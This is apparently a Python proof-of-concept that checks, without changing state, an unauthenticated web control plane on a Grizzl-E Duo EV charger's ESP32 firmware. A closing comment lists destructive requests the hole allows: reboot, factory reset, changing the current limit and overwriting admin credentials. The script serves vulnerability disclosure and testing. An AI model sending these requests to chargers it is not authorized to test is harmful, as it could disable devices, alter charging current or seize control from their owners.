#!/usr/bin/env python3
"""
PoC / test harness for finding N1 — "Unauthenticated web control plane"
(Grizzl-E Duo ESP32 web UI).  See firmware/SECURITY-FINDINGS.md.

WHAT N1 IS
----------
The ESP32 HTTP server registers /pageEvent, /config, /configHttp and /configAP in a
*no-auth* route table. Unlike /service and /ocppconfig (HTTP Basic auth, realm
"Please enter login and password"), those four handlers make ZERO calls into the
Basic-auth routine, yet they perform real state changes: reboot, factory reset,
current-limit changes, serial rewrite, and overwriting the web-UI admin credentials
(httpUsername / httpPassword) WITHOUT presenting the current password.

WHAT THIS SCRIPT DOES  (safe, non-destructive by default)
---------------------------------------------------------
It confirms the vulnerability WITHOUT changing any state:

  1. Baseline      - GET /ocppconfig and /service with NO credentials.
                     A patched/secure unit answers 401 + WWW-Authenticate here.
  2. N1 probe      - POST /configHttp, /config, /configAP and /pageEvent with NO
                     credentials and a body that changes nothing. If the server does
                     NOT answer 401 (i.e. it processes the request), the endpoint is
                     unauthenticated -> N1 confirmed.
  3. (optional)    - With --prove-write, /configHttp is sent an intentionally
                     OVER-LENGTH httpUsername/httpPassword. The firmware's own length
                     check REJECTS over-length values (">Too long ... value<"), so
                     nothing is stored, but the handler echoing that rejection proves
                     it executed field-processing logic with no authentication.

It NEVER sends reboot / factoryReset / a real credential change. Those destructive
request shapes are documented at the bottom of this file for reference only; running
them can wipe local OCPP config or brick the unit (see firmware/README.md).

USAGE
-----
  python3 tools/poc_n1_unauth_webui.py --host 192.168.1.50
  python3 tools/poc_n1_unauth_webui.py --host grizzle.local --prove-write

Only run this against a charger you own / are authorized to test.
"""
from __future__ import annotations

import argparse
import socket
import ssl
import urllib.error
import urllib.request

# Endpoints that SHOULD require auth (expected: 401 with WWW-Authenticate).
PROTECTED = ["/ocppconfig", "/service"]

# No-auth control endpoints under test (expected on a vulnerable unit: NOT 401).
# body=None -> empty POST body (no recognized action/field => no state change).
CONTROL = [
    ("/pageEvent", "grizzle_poc_probe=0"),   # unknown key -> matches no action
    ("/config", ""),                          # empty body -> nothing to change
    ("/configAP", ""),
    ("/configHttp", ""),
]

GREEN, RED, YEL, DIM, RST = "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[0m"


def _request(url: str, *, method: str, body: bytes | None, timeout: float,
             insecure: bool) -> tuple[int | None, dict, str, str | None]:
    """Return (status, headers, body_snippet, error). Never raises."""
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "grizzle-n1-poc")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    ctx = None
    if url.startswith("https"):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
    # A redirect (to a login page, say) must not be followed and then read as "200, processed".
    handlers: list = [_NoRedirect]
    if ctx is not None:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=timeout) as resp:
            data = resp.read(600)
            return resp.status, dict(resp.headers), data.decode("latin1", "replace"), None
    except urllib.error.HTTPError as e:
        # A 401/403/404/500 still carries a status + headers we want to see.
        data = b""
        try:
            data = e.read(600)
        except Exception:
            pass
        return e.code, dict(e.headers or {}), data.decode("latin1", "replace"), None
    except (urllib.error.URLError, socket.timeout, ConnectionError, OSError) as e:
        return None, {}, "", str(e)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):  # noqa: ANN002, ANN003 - urllib's signature
        return None  # urllib then raises HTTPError for the 3xx, which _request reports as that status


def _snippet(text: str, n: int = 120) -> str:
    one = " ".join(text.split())
    return (one[:n] + "…") if len(one) > n else one


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Confirm finding N1 (unauthenticated web control plane) non-destructively."
    )
    ap.add_argument("--host", required=True, help="charger IP or hostname")
    ap.add_argument("--port", type=int, default=None, help="port (default 80, or 443 with --https)")
    ap.add_argument("--https", action="store_true", help="use TLS (default: plain HTTP, as the Duo serves)")
    ap.add_argument("--insecure", action="store_true", help="with --https, do not verify the cert")
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--prove-write", action="store_true",
                    help="also send an OVER-LENGTH (and thus firmware-REJECTED) /configHttp field to elicit "
                    "the handler's own validation echo. Still changes nothing.")
    args = ap.parse_args()

    scheme = "https" if args.https else "http"
    port = args.port if args.port is not None else (443 if args.https else 80)
    base = f"{scheme}://{args.host}:{port}"

    print(f"Target: {base}   (non-destructive N1 check)\n")

    # --- 1. Baseline: are the protected pages actually challenging? ---
    print("[1] Baseline — endpoints that SHOULD require auth:")
    baseline_ok = False
    for path in PROTECTED:
        status, headers, body, err = _request(base + path, method="GET", body=None,
                                               timeout=args.timeout, insecure=args.insecure)
        if err:
            print(f"    {path:14} {RED}unreachable{RST}: {err}")
            continue
        www = headers.get("WWW-Authenticate", "")
        if status == 401:
            baseline_ok = True
            print(f"    {path:14} {GREEN}HTTP 401 — auth enforced{RST}  {DIM}{_snippet(www)}{RST}")
        else:
            print(f"    {path:14} {YEL}HTTP {status} — NOT challenged{RST} {DIM}{_snippet(body)}{RST}")

    # --- 2. N1 probe: control endpoints must NOT require auth on a vulnerable unit ---
    print("\n[2] N1 probe — control endpoints (no credentials sent):")
    unauth_hits = []
    inconclusive = []
    for path, body in CONTROL:
        data = body.encode() if body is not None else b""
        status, headers, rbody, err = _request(base + path, method="POST", body=data,
                                                timeout=args.timeout, insecure=args.insecure)
        if err:
            print(f"    {path:14} {DIM}unreachable: {err}{RST}")
            continue
        if status == 401:
            print(f"    {path:14} {GREEN}401 — auth required (NOT vulnerable here){RST}")
        elif status is not None and 200 <= status < 300:
            unauth_hits.append(path)
            print(f"    {path:14} {RED}HTTP {status} — processed WITHOUT auth{RST} {DIM}{_snippet(rbody)}{RST}")
        else:
            # 403, 404, 405, 5xx...: refused or absent is not "processed". Proves nothing either way.
            inconclusive.append(path)
            print(f"    {path:14} {YEL}HTTP {status} — inconclusive (not a 2xx, not a 401){RST} "
                  f"{DIM}{_snippet(rbody)}{RST}")

    # --- 3. Optional: prove the handler executes field logic (rejected over-length write) ---
    if args.prove_write:
        print("\n[3] Proof of execution — over-length /configHttp field (firmware REJECTS it; no change):")
        long_body = "httpUsername=" + "A" * 48 + "&httpPassword=" + "B" * 80
        status, headers, rbody, err = _request(base + "/configHttp", method="POST",
                                                body=long_body.encode(),
                                                timeout=args.timeout, insecure=args.insecure)
        if err:
            print(f"    {RED}unreachable: {err}{RST}")
        else:
            low = rbody.lower()
            echoed = ("too long" in low) or ("value" in low)
            tag = f"{RED}handler echoed its own validation — executed unauthenticated{RST}" if echoed \
                  else f"{YEL}HTTP {status} (inspect body){RST}"
            print(f"    HTTP {status}: {tag}\n    {DIM}{_snippet(rbody, 200)}{RST}")

    # --- Verdict ---
    print("\n" + "=" * 64)
    if unauth_hits:
        print(f"{RED}N1 CONFIRMED{RST}: {len(unauth_hits)} control endpoint(s) processed "
              f"unauthenticated requests: {', '.join(unauth_hits)}")
        if baseline_ok:
            print(f"{DIM}(and /ocppconfig/service DID challenge, so the differential is real — "
                  f"not a server that ignores auth everywhere.){RST}")
        else:
            print(f"{YEL}note: the protected pages did not return 401 either — verify the host/port "
                  f"and that this is the charger's web UI.{RST}")
        return 2
    if inconclusive:
        print(f"{YEL}N1 inconclusive{RST}: {', '.join(inconclusive)} answered neither 2xx nor 401 "
              f"(wrong host/port, a different device, or a firmware that changed these paths).")
        return 3
    print(f"{GREEN}N1 not reproduced{RST}: no control endpoint processed an unauthenticated request "
          f"(firmware may be patched, or host/port wrong).")
    return 0


# ---------------------------------------------------------------------------
# REFERENCE ONLY — DESTRUCTIVE request shapes N1 enables. DO NOT run casually.
# A factory reset can remove local OCPP config; a bad current/relay change or a
# bricked unit is possible. See firmware/README.md. These are intentionally NOT
# wired into any code path above.
#
#   Reboot:                 POST /pageEvent    body: reboot=1
#   Factory reset:          POST /pageEvent    body: factoryReset=1
#   Full factory reset:     POST /pageEvent    body: fullFactoryReset=1
#   Change current limit:   POST /pageEvent    body: stationCurrentLimit=<amps>
#   Overwrite admin creds:  POST /configHttp   body: httpUsername=<u>&httpPassword=<p>&httpPasswordConf=<p>
#   Overwrite stored hash:  POST /pageEvent    body: md5hash=<hash>
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    raise SystemExit(main())
